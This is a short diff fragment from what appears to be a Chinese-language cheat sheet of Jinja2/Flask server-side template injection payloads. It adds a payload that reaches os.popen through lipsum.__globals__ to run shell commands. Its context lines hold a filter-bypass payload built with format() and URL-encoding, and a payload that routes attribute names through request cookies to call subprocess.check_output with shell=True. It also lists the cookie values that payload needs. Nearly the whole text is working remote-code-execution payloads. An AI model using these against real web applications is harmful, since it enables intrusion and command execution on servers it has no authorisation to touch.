@@ -343,6 +343,11 @@ config
 ```python
 # " [] _ 
 {%25print(''|attr('%25c%25c%25c%25c%25c%25c%25c%25c%25c'|format(95,95,99,108,97,115,115,95,95)))%25}
+
+
+{{lipsum.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
+
+
 #request
 {{request[request.cookies['a']][request.cookies['b']][request.cookies['c']][request.cookies['d']][request.cookies['e']][request.cookies['f']]('subprocess')[request.cookies['g']](request.cookies['h'],shell=True)}}
 # cookie 传入 "a": "__class__"_ "b": "_get_file_stream"_ "c": "im_func"_ "d": "func_globals"_ _ _ _"e": "__builtins__""f": "__import__""g": "check_output""h": cmd
